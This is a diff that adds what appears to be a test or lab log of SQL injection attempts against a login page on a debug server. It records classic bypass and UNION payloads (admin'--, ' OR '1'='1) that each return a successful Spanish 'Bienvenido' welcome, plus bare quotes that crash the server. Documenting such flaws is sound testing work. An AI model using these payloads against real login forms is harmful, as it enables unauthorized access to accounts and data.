@@ -1,0 +1,40 @@
+## user=[admin'--] pass=[x]
+HTTP/1.0 200 OK
+Server: PhantomServer/2.4.1-debug 
+Date: Thu, 12 Nov 2026 13:58:08 GMT
+Content-Type: text/html; charset=utf-8
+
+<h1>Bienvenido, admin'--</h1>
+
+## user=[x] pass=[' OR 1=1 --]
+HTTP/1.0 200 OK
+Server: PhantomServer/2.4.1-debug 
+Date: Thu, 12 Nov 2026 13:58:08 GMT
+Content-Type: text/html; charset=utf-8
+
+<h1>Bienvenido, x</h1>
+
+## user=[' OR '1'='1] pass=[' OR '1'='1]
+HTTP/1.0 200 OK
+Server: PhantomServer/2.4.1-debug 
+Date: Thu, 12 Nov 2026 13:58:08 GMT
+Content-Type: text/html; charset=utf-8
+
+<h1>Bienvenido, ' OR '1'='1</h1>
+
+## user=[' UNION SELECT 'inyectado' --] pass=[x]
+HTTP/1.0 200 OK
+Server: PhantomServer/2.4.1-debug 
+Date: Thu, 12 Nov 2026 13:58:08 GMT
+Content-Type: text/html; charset=utf-8
+
+<h1>Bienvenido, ' UNION SELECT 'inyectado' --</h1>
+
+## user=['] pass=[x]
+curl: (52) Empty reply from server
+
+
+## user=[O'Brien] pass=[x]
+curl: (52) Empty reply from server
+
+
